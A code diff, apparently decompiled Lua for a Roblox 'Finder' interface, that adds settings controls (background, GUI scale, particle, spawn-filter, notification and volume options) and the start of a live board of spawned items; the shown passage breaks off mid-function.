+          fn41(v80.Scroll, "BACKGROUND", 1)
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "Card"
+          frame3.Size = UDim2.new(1, -16, 0, flag15 and 52 or 58)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 2
+          frame3.ClipsDescendants = true
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 10)
+          local scrollingFrame = Instance.new("ScrollingFrame")
+          scrollingFrame.Name = "BackgroundScroller"
+          scrollingFrame.Size = UDim2.new(1, -8, 1, 0)
+          scrollingFrame.Position = UDim2.fromOffset(6, 0)
+          scrollingFrame.BackgroundTransparency = 1
+          scrollingFrame.BorderSizePixel = 0
+          scrollingFrame.ScrollBarThickness = 0
+          scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
+          scrollingFrame.CanvasSize = UDim2.new()
+          scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
+          scrollingFrame.Active = true
+          scrollingFrame.Parent = frame3
+          fn43(scrollingFrame, v80.Scroll)
+          local uiListLayout = Instance.new("UIListLayout")
+          uiListLayout.FillDirection = Enum.FillDirection.Horizontal
+          uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Left
+          uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
+          uiListLayout.Padding = UDim.new(0, 5)
+          uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+          uiListLayout.Parent = scrollingFrame
+          local uiPadding = Instance.new("UIPadding")
+          uiPadding.PaddingLeft = UDim.new(0, 6)
+          uiPadding.PaddingRight = UDim.new(0, 4)
+          uiPadding.Parent = scrollingFrame
+          local tbl26 = {}
+
+          local function fn44()
+            for i, v83 in ipairs(tbl26) do
+              local visible = finderUISettingsState.BackgroundIndex == i
+              v83.Button.BackgroundColor3 = visible and Color3.fromRGB(32, 32, 38) or tbl21.PhotoBG
+              v83.Image.ImageTransparency = visible and 0 or 0.28
+              v83.Selection.Visible = visible
+              v83.Caption.TextColor3 = visible and tbl21.White or Color3.fromRGB(190, 192, 202)
+            end
+          end
+
+          local function fn45(arg)
+            local backgroundIndex = math.clamp(tonumber(arg) or 1, 1, #tbl19)
+            finderUISettingsState.BackgroundIndex = backgroundIndex
+            local v83 = tbl19[backgroundIndex]
+
+            if v83.IsNone then
+              imageLabel.Visible = false
+              instance.BackgroundColor3 = tbl21.BG
+            else
+              imageLabel.Image = v83.Image
+              imageLabel.ScaleType = v83.ScaleType
+              imageLabel.Visible = true
+            end
+
+            fn44()
+            aceFinderRuntime.SaveConfig()
+          end
+
+          for i, v83 in ipairs(tbl19) do
+            local textButton = Instance.new("TextButton")
+            textButton.Name = v83.Name
+            textButton.LayoutOrder = i
+            textButton.Size = UDim2.fromOffset(flag15 and 38 or 42, flag15 and 38 or 42)
+            textButton.BackgroundColor3 = tbl21.PhotoBG
+            textButton.BorderSizePixel = 0
+            textButton.Text = ""
+            textButton.AutoButtonColor = false
+            textButton.ClipsDescendants = true
+            textButton.Parent = scrollingFrame
+            fn35(textButton, 8)
+            local imageLabel2 = Instance.new("ImageLabel")
+            imageLabel2.Name = "Preview"
+            imageLabel2.Size = UDim2.fromScale(1, 1)
+            imageLabel2.BackgroundTransparency = 1
+            imageLabel2.Image = v83.Image
+            imageLabel2.ScaleType = v83.ScaleType
+            imageLabel2.BorderSizePixel = 0
+            imageLabel2.Parent = textButton
+            fn35(imageLabel2, 8)
+
+            if v83.IsNone then
+              local noBg = createTextLabel(textButton, "NO BG", 6, tbl21.White, Enum.Font.GothamBold)
+              noBg.Size = UDim2.new(1, 0, 1, -10)
+              noBg.TextXAlignment = Enum.TextXAlignment.Center
+              noBg.TextYAlignment = Enum.TextYAlignment.Center
+              noBg.ZIndex = 2
+            end
+
+            local v84 = createTextLabel(textButton, v83.IsNone and "NONE" or tostring(i - 1), 8, tbl21.White, Enum.Font.GothamBold)
+            v84.Size = UDim2.new(1, 0, 0, 13)
+            v84.Position = UDim2.new(0, 0, 1, -15)
+            v84.TextXAlignment = Enum.TextXAlignment.Center
+            v84.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+            v84.TextStrokeTransparency = 0
+            v84.ZIndex = 3
+            local frame4 = Instance.new("Frame")
+            frame4.Name = "Selected"
+            frame4.Size = UDim2.new(1, -12, 0, 2)
+            frame4.Position = UDim2.new(0, 6, 1, -4)
+            frame4.BackgroundColor3 = tbl21.White
+            frame4.BorderSizePixel = 0
+            frame4.ZIndex = 4
+            frame4.Parent = textButton
+            fn35(frame4, 1)
+            tbl26[i] = { Button = textButton, Image = imageLabel2, Caption = v84, Selection = frame4 }
+
+            textButton.MouseButton1Click:Connect(function()
+              fn45(i)
+            end)
+          end
+
+          fn44()
+        end
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "GUI Scale"
+          frame3.Size = UDim2.new(1, -16, 0, 60)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 3
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 10)
+          local v83 = createTextLabel(frame3, "", flag15 and 8 or 11, tbl21.White, Enum.Font.GothamMedium)
+          v83.Size = UDim2.new(1, -138, 1, 0)
+          v83.Position = UDim2.fromOffset(16, 0)
+          v83.TextYAlignment = Enum.TextYAlignment.Center
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "Minus"
+          textButton.Size = UDim2.fromOffset(28, 30)
+          textButton.Position = UDim2.new(1, -120, 0.5, -13)
+          textButton.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+          textButton.BorderSizePixel = 0
+          textButton.Text = "-"
+          textButton.TextColor3 = tbl21.White
+          textButton.TextSize = 14
+          textButton.Font = Enum.Font.GothamBlack
+          textButton.AutoButtonColor = false
+          textButton.Parent = frame3
+          fn35(textButton, 7)
+          local v84 = 1
+          createUIStroke2(textButton, Color3.fromRGB(72, 74, 84), v84, 0.35)
+          local white = tbl21.White
+          local gothamBlack = Enum.Font.GothamBlack
+          local v85 = createTextLabel(frame3, string.format("%.2f", finderUISettingsState.GuiScale), 12, white, gothamBlack)
+          v85.Name = "ScaleValue"
+          v85.Size = UDim2.fromOffset(48, 30)
+          v85.Position = UDim2.new(1, -86, 0.5, -13)
+          v85.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+          v85.BackgroundTransparency = 0.05
+          v85.TextXAlignment = Enum.TextXAlignment.Center
+          v85.TextYAlignment = Enum.TextYAlignment.Center
+          fn35(v85, 7)
+          local v86 = 1
+          createUIStroke2(v85, Color3.fromRGB(72, 74, 84), v86, 0.35)
+          local textButton2 = Instance.new("TextButton")
+          textButton2.Name = "Plus"
+          textButton2.Size = UDim2.fromOffset(28, 30)
+          textButton2.Position = UDim2.new(1, -32, 0.5, -13)
+          textButton2.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+          textButton2.BorderSizePixel = 0
+          textButton2.Text = "+"
+          textButton2.TextColor3 = tbl21.White
+          textButton2.TextSize = 14
+          textButton2.Font = Enum.Font.GothamBlack
+          textButton2.AutoButtonColor = false
+          textButton2.Parent = frame3
+          fn35(textButton2, 6)
+          createUIStroke2(textButton2, Color3.fromRGB(72, 74, 84), 1, 0.35)
+
+          local function fn43(arg)
+            local clamp = math.clamp
+            local floor2 = math.floor
+            local n36 = tonumber(arg) or 1
+            local v87 = 0.5
+            local v88 = 1.5
+            local v89 = clamp(floor2(n36 * 100 + 0.5) / 100, v87, v88)
+            finderUISettingsState.GuiScale = v89
+            uiScale.Scale = v89 * n32
+            v85.Text = string.format("%.2f", v89)
+            aceFinderRuntime.SaveConfig()
+          end
+
+          textButton.MouseButton1Click:Connect(function()
+            fn43(finderUISettingsState.GuiScale - 0.05)
+          end)
+
+          textButton2.MouseButton1Click:Connect(function()
+            fn43(finderUISettingsState.GuiScale + 0.05)
+          end)
+        end
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "Falling Snow"
+          frame3.Size = UDim2.new(1, -16, 0, 42)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 4
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 10)
+          local fallingSnow = createTextLabel(frame3, "Falling snow", flag15 and 10 or 11, tbl21.White, Enum.Font.GothamMedium)
+          fallingSnow.Size = UDim2.new(1, -78, 1, 0)
+          fallingSnow.Position = UDim2.fromOffset(16, 0)
+          fallingSnow.TextYAlignment = Enum.TextYAlignment.Center
+          local instance2 = Instance.new("Frame")
+          instance2.Name = "Track"
+          instance2.Size = UDim2.fromOffset(44, 32)
+          instance2.Position = UDim2.new(1, -56, 0.5, -16)
+          instance2.BorderSizePixel = 0
+          instance2.Parent = frame3
+          fn35(instance2, 12)
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "Knob"
+          frame4.Size = UDim2.fromOffset(18, 18)
+          frame4.BorderSizePixel = 0
+          frame4.Parent = instance2
+          fn35(frame4, 9)
+          local instance3 = Instance.new("TextButton")
+          instance3.Name = "ToggleButton"
+          instance3.Size = UDim2.fromScale(1, 1)
+          instance3.BackgroundTransparency = 1
+          instance3.Text = ""
+          instance3.ZIndex = 4
+          instance3.Parent = frame3
+
+          local function fn43(arg)
+            local fallingParticlesEnabled = finderUISettingsState.FallingParticlesEnabled
+
+            local tbl26 = {
+              BackgroundColor3 = fallingParticlesEnabled and tbl21.White or tbl21.TrackOff,
+              BackgroundTransparency = fallingParticlesEnabled and 0 or 0.08,
+            }
+
+            local tbl27 = {
+              Position = fallingParticlesEnabled and UDim2.fromOffset(23, 3) or UDim2.fromOffset(3, 3),
+              BackgroundColor3 = fallingParticlesEnabled and tbl21.BG or tbl21.KnobOff,
+            }
+
+            if arg then
+              fn34(instance2, tweenInfo, tbl26)
+              fn34(frame4, tweenInfo, tbl27)
+            else
+              for k, v83 in pairs(tbl26) do
+                instance2[k] = v83
+              end
+
+              for k, v83 in pairs(tbl27) do
+                frame4[k] = v83
+              end
+            end
+
+            local aceFallingDots = instance:FindFirstChild("ACEFallingDots")
+
+            if aceFallingDots then
+              aceFallingDots.Visible = fallingParticlesEnabled
+            end
+          end
+
+          fn43(false)
+
+          instance3.MouseButton1Click:Connect(function()
+            finderUISettingsState.FallingParticlesEnabled = not finderUISettingsState.FallingParticlesEnabled
+            fn43(true)
+            aceFinderRuntime.SaveConfig()
+          end)
+        end
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "OG Spawns Only"
+          frame3.Size = UDim2.new(1, -16, 0, 42)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 5
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 8)
+          local ogSpawnsOnly = createTextLabel(frame3, "OG spawns only", flag15 and 10 or 11, tbl21.White, Enum.Font.GothamMedium)
+          ogSpawnsOnly.Size = UDim2.new(1, -78, 1, 0)
+          ogSpawnsOnly.Position = UDim2.fromOffset(16, 0)
+          ogSpawnsOnly.TextYAlignment = Enum.TextYAlignment.Center
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "Track"
+          frame4.Size = UDim2.fromOffset(44, 32)
+          frame4.Position = UDim2.new(1, -56, 0.5, -12)
+          frame4.BorderSizePixel = 0
+          frame4.Parent = frame3
+          fn35(frame4, 16)
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "Knob"
+          frame5.Size = UDim2.fromOffset(18, 18)
+          frame5.BorderSizePixel = 0
+          frame5.Parent = frame4
+          fn35(frame5, 9)
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "ToggleButton"
+          textButton.Size = UDim2.fromScale(1, 1)
+          textButton.BackgroundTransparency = 1
+          textButton.Text = ""
+          textButton.ZIndex = 4
+          textButton.Parent = frame3
+
+          local function fn43(arg)
+            local ogOnlyEnabled = finderUISettingsState.OGOnlyEnabled
+
+            local tbl26 = {
+              BackgroundColor3 = ogOnlyEnabled and tbl21.White or tbl21.TrackOff,
+              BackgroundTransparency = ogOnlyEnabled and 0 or 0.08,
+            }
+
+            local tbl27 = {
+              Position = ogOnlyEnabled and UDim2.fromOffset(23, 3) or UDim2.fromOffset(3, 3),
+              BackgroundColor3 = ogOnlyEnabled and tbl21.BG or tbl21.KnobOff,
+            }
+
+            if arg then
+              fn34(frame4, tweenInfo, tbl26)
+              fn34(frame5, tweenInfo, tbl27)
+            else
+              for k, v83 in pairs(tbl26) do
+                frame4[k] = v83
+              end
+
+              for k, v83 in pairs(tbl27) do
+                frame5[k] = v83
+              end
+            end
+          end
+
+          table.insert(aceFinderRuntime.OGModeVisualRefreshers, fn43)
+          fn43(false)
+
+          textButton.MouseButton1Click:Connect(function()
+            aceFinderRuntime.SetOGOnlyEnabled(not finderUISettingsState.OGOnlyEnabled, true)
+          end)
+        end
+
+        fn41(v80.Scroll, "NOTIFICATIONS", 6)
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "Notifications"
+          frame3.Size = UDim2.new(1, -16, 0, 60)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 7
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 8)
+          local notifications = createTextLabel(frame3, "Notifications", flag15 and 10 or 11, tbl21.White, Enum.Font.GothamMedium)
+          notifications.Size = UDim2.new(1, -78, 1, 0)
+          notifications.Position = UDim2.fromOffset(12, 0)
+          notifications.TextYAlignment = Enum.TextYAlignment.Center
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "Track"
+          frame4.Size = UDim2.fromOffset(44, 32)
+          frame4.Position = UDim2.new(1, -50, 0.5, -12)
+          frame4.BorderSizePixel = 0
+          frame4.Parent = frame3
+          fn35(frame4, 12)
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "Knob"
+          frame5.Size = UDim2.fromOffset(18, 18)
+          frame5.BorderSizePixel = 0
+          frame5.Parent = frame4
+          fn35(frame5, 9)
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "ToggleButton"
+          textButton.Size = UDim2.fromScale(1, 1)
+          textButton.BackgroundTransparency = 1
+          textButton.Text = ""
+          textButton.ZIndex = 4
+          textButton.Parent = frame3
+
+          local function fn43(arg)
+            local notificationsEnabled = finderUISettingsState.NotificationsEnabled
+            local tbl26 = {
+              BackgroundColor3 = notificationsEnabled and tbl21.White or tbl21.TrackOff,
+              BackgroundTransparency = notificationsEnabled and 0 or 0.08,
+            }
+
+            local tbl27 = {
+              Position = notificationsEnabled and UDim2.fromOffset(23, 3) or UDim2.fromOffset(3, 3),
+              BackgroundColor3 = notificationsEnabled and tbl21.BG or tbl21.KnobOff,
+            }
+
+            if arg then
+              fn34(frame4, tweenInfo, tbl26)
+              fn34(frame5, tweenInfo, tbl27)
+            else
+              for k, v83 in pairs(tbl26) do
+                frame4[k] = v83
+              end
+
+              for k, v83 in pairs(tbl27) do
+                frame5[k] = v83
+              end
+            end
+          end
+
+          fn43(false)
+
+          textButton.MouseButton1Click:Connect(function()
+            finderUISettingsState.NotificationsEnabled = not finderUISettingsState.NotificationsEnabled
+            fn43(true)
+
+            if not finderUISettingsState.NotificationsEnabled then
+              fn32()
+
+              if v79 then
+                v79:Destroy()
+                v79 = nil
+              end
+            end
+
+            aceFinderRuntime.SaveConfig()
+          end)
+        end
+
+        do
+          local instance2 = Instance.new("Frame")
+          instance2.Name = "Notification Sounds"
+          instance2.Size = UDim2.new(1, -16, 0, 42)
+          instance2.BackgroundColor3 = tbl21.Card
+          instance2.BackgroundTransparency = 0
+          instance2.BorderSizePixel = 0
+          instance2.LayoutOrder = 8
+          instance2.Parent = v80.Scroll
+          fn35(instance2, 10)
+          local notificationSounds =
+            createTextLabel(instance2, "Notification Sounds", flag15 and 10 or 11, tbl21.White, Enum.Font.GothamMedium)
+          notificationSounds.Size = UDim2.new(1, -78, 1, 0)
+          notificationSounds.Position = UDim2.fromOffset(16, 0)
+          notificationSounds.TextYAlignment = Enum.TextYAlignment.Center
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "Track"
+          frame3.Size = UDim2.fromOffset(44, 32)
+          frame3.Position = UDim2.new(1, -50, 0.5, -12)
+          frame3.BorderSizePixel = 0
+          frame3.Parent = instance2
+          fn35(frame3, 12)
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "Knob"
+          frame4.Size = UDim2.fromOffset(18, 18)
+          frame4.BorderSizePixel = 0
+          frame4.Parent = frame3
+          fn35(frame4, 9)
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "ToggleButton"
+          textButton.Size = UDim2.fromScale(1, 1)
+          textButton.BackgroundTransparency = 1
+          textButton.Text = ""
+          textButton.ZIndex = 6
+          textButton.Parent = instance2
+
+          local function fn43(arg)
+            local notificationSoundsEnabled = finderUISettingsState.NotificationSoundsEnabled
+            local tbl26 = {
+              BackgroundColor3 = notificationSoundsEnabled and tbl21.White or tbl21.TrackOff,
+              BackgroundTransparency = notificationSoundsEnabled and 0 or 0.08,
+            }
+
+            local tbl27 = {
+              Position = notificationSoundsEnabled and UDim2.fromOffset(23, 3) or UDim2.fromOffset(3, 3),
+              BackgroundColor3 = notificationSoundsEnabled and tbl21.BG or tbl21.KnobOff,
+            }
+
+            if arg then
+              fn34(frame3, tweenInfo, tbl26)
+              fn34(frame4, tweenInfo, tbl27)
+            else
+              for k, v83 in pairs(tbl26) do
+                frame3[k] = v83
+              end
+
+              for k, v83 in pairs(tbl27) do
+                frame4[k] = v83
+              end
+            end
+          end
+
+          fn43(false)
+
+          textButton.MouseButton1Click:Connect(function()
+            finderUISettingsState.NotificationSoundsEnabled = not finderUISettingsState.NotificationSoundsEnabled
+            fn43(true)
+
+            if finderUISettingsState.NotificationSoundsEnabled then
+              fn33(function(arg, arg2)
+                if not arg and arg2 then
+                  aceFinderRuntime.LastSoundError = tostring(arg2)
+                end
+              end)
+            else
+              fn32()
+            end
+
+            aceFinderRuntime.SaveConfig()
+          end)
+        end
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "Notification Sound"
+          frame3.Size = UDim2.new(1, -16, 0, 42)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 9
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 10)
+          local notificationSound = createTextLabel(frame3, "Notification Sound", flag15 and 9 or 11, tbl21.White, Enum.Font.GothamMedium)
+          notificationSound.Size = UDim2.new(1, -(flag15 and 176 or 196), 1, 0)
+          notificationSound.Position = UDim2.fromOffset(12, 0)
+          notificationSound.TextYAlignment = Enum.TextYAlignment.Center
+          local n36 = flag15 and 28 or 32
+          local n37 = flag15 and 86 or 96
+          local instance2 = Instance.new("TextButton")
+          instance2.Name = "SoundLeft"
+          instance2.Size = UDim2.fromOffset(n36, 28)
+          instance2.Position = UDim2.new(1, -(n36 * 2 + n37 + 10 + 10), 0.5, -14)
+          instance2.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+          instance2.BorderSizePixel = 0
+          instance2.Text = "<"
+          instance2.TextColor3 = tbl21.White
+          instance2.TextSize = 12
+          instance2.Font = Enum.Font.GothamSemibold
+          instance2.AutoButtonColor = false
+          instance2.Parent = frame3
+          fn35(instance2, 6)
+          createUIStroke2(instance2, Color3.fromRGB(72, 74, 84), 1, 0.35)
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "SoundValueHolder"
+          frame4.Size = UDim2.fromOffset(n37, 28)
+          frame4.Position = UDim2.new(1, -(n37 + n36 + 5 + 10), 0.5, -14)
+          frame4.BackgroundColor3 = Color3.fromRGB(8, 8, 12)
+          frame4.BorderSizePixel = 0
+          frame4.Parent = frame3
+          fn35(frame4, 6)
+          createUIStroke2(frame4, Color3.fromRGB(72, 74, 84), 1, 0.35)
+          local v83 = createTextLabel(
+            frame4,
+            tbl20[finderUISettingsState.NotificationSoundIndex].Name,
+            flag15 and 9 or 8,
+            tbl21.White,
+            Enum.Font.GothamSemibold
+          )
+          v83.Size = UDim2.fromScale(1, 1)
+          v83.TextXAlignment = Enum.TextXAlignment.Center
+          v83.TextYAlignment = Enum.TextYAlignment.Center
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "SoundRight"
+          textButton.Size = UDim2.fromOffset(n36, 28)
+          textButton.Position = UDim2.new(1, -(n36 + 8), 0.5, -14)
+          textButton.BackgroundColor3 = Color3.fromRGB(8, 12, 12)
+          textButton.BorderSizePixel = 0
+          textButton.Text = ">"
+          textButton.TextColor3 = tbl21.White
+          textButton.TextSize = 12
+          textButton.Font = Enum.Font.GothamSemibold
+          textButton.AutoButtonColor = false
+          textButton.Parent = frame3
+          fn35(textButton, 7)
+          createUIStroke2(textButton, Color3.fromRGB(72, 74, 84), 1, 0.35)
+
+          local function fn43(notificationSoundIndex)
+            if notificationSoundIndex < 1 then
+              notificationSoundIndex = #tbl20
+            end
+
+            if #tbl20 < notificationSoundIndex then
+              notificationSoundIndex = 1
+            end
+
+            finderUISettingsState.NotificationSoundIndex = notificationSoundIndex
+            v83.Text = tbl20[notificationSoundIndex].Name
+            aceFinderRuntime.SaveConfig()
+
+            fn33(function(arg, arg2)
+              if not arg and arg2 then
+                aceFinderRuntime.LastSoundError = tostring(arg2)
+              end
+            end)
+          end
+
+          instance2.MouseButton1Click:Connect(function()
+            fn43(finderUISettingsState.NotificationSoundIndex - 1)
+          end)
+
+          textButton.MouseButton1Click:Connect(function()
+            fn43(finderUISettingsState.NotificationSoundIndex + 1)
+          end)
+        end
+
+        do
+          local frame3 = Instance.new("Frame")
+          frame3.Name = "Notification Volume"
+          frame3.Size = UDim2.new(1, -16, 0, 62)
+          frame3.BackgroundColor3 = tbl21.Card
+          frame3.BackgroundTransparency = 0
+          frame3.BorderSizePixel = 0
+          frame3.LayoutOrder = 8
+          frame3.Parent = v80.Scroll
+          fn35(frame3, 10)
+          local notificationVolume =
+            createTextLabel(frame3, "Notification Volume", flag15 and 10 or 11, tbl21.White, Enum.Font.GothamMedium)
+          notificationVolume.Size = UDim2.new(0.6, 0, 0, 23)
+          notificationVolume.Position = UDim2.fromOffset(16, 2)
+          notificationVolume.TextYAlignment = Enum.TextYAlignment.Center
+          local v83 = createTextLabel(frame3, "", flag15 and 9 or 8, tbl21.Muted, Enum.Font.GothamSemibold)
+          v83.Size = UDim2.new(0.4, -12, 0, 23)
+          v83.Position = UDim2.new(0.6, 0, 0, 2)
+          v83.TextXAlignment = Enum.TextXAlignment.Right
+          v83.TextYAlignment = Enum.TextYAlignment.Center
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "VolumeSlider"
+          textButton.Size = UDim2.new(1, -28, 0, 8)
+          textButton.Position = UDim2.fromOffset(14, 29)
+          textButton.BackgroundColor3 = Color3.fromRGB(43, 44, 51)
+          textButton.BorderSizePixel = 0
+          textButton.Text = ""
+          textButton.AutoButtonColor = false
+          textButton.Parent = frame3
+          fn35(textButton, 4)
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "Fill"
+          frame4.Size = UDim2.fromScale(finderUISettingsState.NotificationVolume, 1)
+          frame4.BackgroundColor3 = tbl21.White
+          frame4.BorderSizePixel = 0
+          frame4.Parent = textButton
+          fn35(frame4, 4)
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "Knob"
+          frame5.Size = UDim2.fromOffset(14, 14)
+          frame5.AnchorPoint = Vector2.new(0.5, 0.5)
+          frame5.Position = UDim2.new(finderUISettingsState.NotificationVolume, 0, 0.5, 0)
+          frame5.BackgroundColor3 = tbl21.White
+          frame5.BorderSizePixel = 0
+          frame5.ZIndex = textButton.ZIndex + 1
+          frame5.Parent = textButton
+          fn35(frame5, 7)
+          local v84 = createTextLabel(frame3, "0%", flag15 and 7 or 8, tbl21.Muted, Enum.Font.GothamMedium)
+          v84.Size = UDim2.new(0.33333333333333331, -8, 0, 16)
+          v84.Position = UDim2.fromOffset(12, 42)
+          v84.TextXAlignment = Enum.TextXAlignment.Left
+          local v85 = createTextLabel(frame3, "50%", flag15 and 7 or 8, tbl21.Muted, Enum.Font.GothamMedium)
+          v85.Size = UDim2.new(0.33333333333333331, 0, 0, 16)
+          v85.Position = UDim2.new(0.33333333333333331, 0, 0, 42)
+          v85.TextXAlignment = Enum.TextXAlignment.Center
+          local v86 = createTextLabel(frame3, "100%", flag15 and 7 or 8, tbl21.Muted, Enum.Font.GothamMedium)
+          v86.Size = UDim2.new(0.33333333333333331, -12, 0, 12)
+          v86.Position = UDim2.new(0.66666666666666663, 0, 0, 60)
+          v86.TextXAlignment = Enum.TextXAlignment.Right
+
+          local function fn43(arg, arg2)
+            local notificationVolume2 = math.clamp(tonumber(arg) or 0, 0, 1)
+            finderUISettingsState.NotificationVolume = notificationVolume2
+            frame4.Size = UDim2.fromScale(notificationVolume2, 1)
+            frame5.Position = UDim2.new(notificationVolume2, 0, 0.5, 0)
+            v83.Text = string.format("%d%%", math.floor(notificationVolume2 * 100 + 0.5))
+            local finderUINotificationSound = genv3.FinderUINotificationSound
+
+            if finderUINotificationSound and finderUINotificationSound.Parent then
+              local v87 = tbl20[finderUISettingsState.NotificationSoundIndex]
+              finderUINotificationSound.Volume = math.clamp((tonumber(v87 and v87.Volume) or 0.65) * notificationVolume2, 0, 10)
+            elseif arg2 then
+              fn33(function(arg3, arg4)
+                if not arg3 and arg4 then
+                  aceFinderRuntime.LastSoundError = tostring(arg4)
+                end
+              end)
+            end
+          end
+
+          fn43(finderUISettingsState.NotificationVolume, false)
+          local flag16 = false
+
+          local function fn44(arg)
+            local x = textButton.AbsoluteSize.X
+            if x <= 0 then
+              return
+            end
+            fn43((arg.Position.X - textButton.AbsolutePosition.X) / x, false)
+          end
+
+          textButton.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+              flag16 = true
+              fn44(input)
+            end
+          end)
+
+          fn31(service.InputChanged, function(arg)
+            if not flag16 then
+              return
+            end
+
+            if arg.UserInputType == Enum.UserInputType.MouseMovement or arg.UserInputType == Enum.UserInputType.Touch then
+              fn44(arg)
+            end
+          end)
+
+          fn31(service.InputEnded, function(arg)
+            if flag16 and (arg.UserInputType == Enum.UserInputType.MouseButton1 or arg.UserInputType == Enum.UserInputType.Touch) then
+              flag16 = false
+              fn44(arg)
+              aceFinderRuntime.SaveConfig()
+
+              if 0 < finderUISettingsState.NotificationVolume then
+                fn33(function(arg2, arg3)
+                  if not arg2 and arg3 then
+                    aceFinderRuntime.LastSoundError = tostring(arg3)
+                  end
+                end)
+              else
+                fn32()
+              end
+            end
+          end)
+        end
+
+        do
+          local entries = {}
+          local tbl26 = {}
+          local v83 = 0
+          local v84 = 0
+          aceFinderRuntime.PendingClaimsByUID = {}
+
+          local function fn43(arg)
+            if arg == nil then
+              return nil
+            end
+            return tostring(arg)
+          end
+
+          local function fn44(arg, arg2)
+            local v85 = table.find(arg, arg2)
+
+            if v85 then
+              table.remove(arg, v85)
+            end
+          end
+
+          local function fn45(arg)
+            local v85 = fn43(arg)
+            local v86 = v85 and entries[v85]
+            if not v86 then
+              return
+            end
+            entries[v85] = nil
+            aceFinderRuntime.PendingClaimsByUID[v85] = nil
+            fn44(v86.LinkedCards, v86.Card)
+
+            if v86.OnlineCard then
+              fn44(tbl25, v86.OnlineCard)
+            end
+
+            for i, v87 in ipairs(tbl26) do
+              if v87 == v86 then
+                table.remove(tbl26, i)
+                break
+              end
+            end
+
+            if v86.Card and v86.Card.Parent then
+              v86.Card:Destroy()
+            end
+
+            if v86.OnlineCard and v86.OnlineCard.Parent then
+              v86.OnlineCard:Destroy()
+            end
+          end
+
+          local function fn46(arg, arg2)
+            if not arg or not arg.Controller.GetOwnerUserId() then
+              return
+            end
+            arg.OnlineRemovalGeneration = (arg.OnlineRemovalGeneration or 0) + 1
+
+            if not arg.OnlineCard or not arg.OnlineCard.Parent then
+              local v85, v86 = fn42(
+                online.Scroll,
+                arg.OwnerDisplayName,
+                arg.OwnerDisplayName,
+                arg.BrainrotName,
+                arg.Mutation,
+                { OwnerUserId = arg.Controller.GetOwnerUserId(), UID = arg.UID, IsOG = arg.IsOG }
+              )
+              v85.LayoutOrder = arg.Card.LayoutOrder
+              v85:SetAttribute("SpawnSequence", arg.Sequence or 0)
+              v85:SetAttribute("LiveboardUID", tostring(arg.UID))
+              v85:SetAttribute("Scope", "ONLINE")
+              arg.OnlineCard = v85
+              arg.OnlineController = v86
+              table.insert(tbl25, v85)
+              v82()
+            end
+
+            if arg.OnlineController.GetOwnerUserId() ~= arg.Controller.GetOwnerUserId() then
+              local ownerDisplayName = arg.OwnerDisplayName
+              arg.OnlineController.SetOwner(arg.Controller.GetOwnerUserId(), ownerDisplayName)
+            end
+
+            arg.OnlineController.SetSpawnAge(workspace:GetServerTimeNow() - arg.SpawnedAt)
+            arg.OnlineController.SetPresence(arg2 or "ingame")
+          end
+
+          local function fn47(arg, presenceState)
+            if not arg or entries[arg.UIDKey] ~= arg then
+              return
+            end
+            arg.PresenceState = presenceState
+            arg.Controller.SetPresence(presenceState)
+
+            if presenceState == "server" or presenceState == "ingame" then
+              fn46(arg, presenceState)
+            elseif arg.OnlineCard then
+              fn44(tbl25, arg.OnlineCard)
+
+              if arg.OnlineCard.Parent then
+                arg.OnlineCard:Destroy()
+              end
+
+              arg.OnlineCard = nil
+              arg.OnlineController = nil
+              v82()
+            end
+          end
+
+          local function fn48()
+            local tbl27 = {}
+            local tbl28 = {}
+
+            for _, v85 in ipairs(tbl26) do
